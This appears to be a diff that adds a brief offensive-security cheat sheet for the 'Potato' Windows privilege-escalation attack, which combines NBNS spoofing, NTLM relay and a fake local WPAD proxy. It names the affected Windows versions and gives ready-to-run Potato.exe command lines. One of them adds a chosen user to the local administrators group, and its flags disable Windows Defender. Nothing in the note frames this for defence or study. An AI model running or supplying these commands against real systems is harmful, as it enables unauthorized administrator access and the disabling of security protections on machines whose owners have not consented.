@@ -1,0 +1,11 @@
+# NBNS spoofing + NTLM relay + implementation of a fake WPAD proxy server which is running locally on the target host
+
+# Windows 7, 8, 10, Server 2008 and 2012 affected
+
+# syntax
+Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
+
+# command to add user to admin group
+Potato.exe -ip -cmd "C:\\Windows\System32\cmd.exe /K net localgroup administrators <username> /ADD" -disable_exhaust true -disable_defender true
+
+
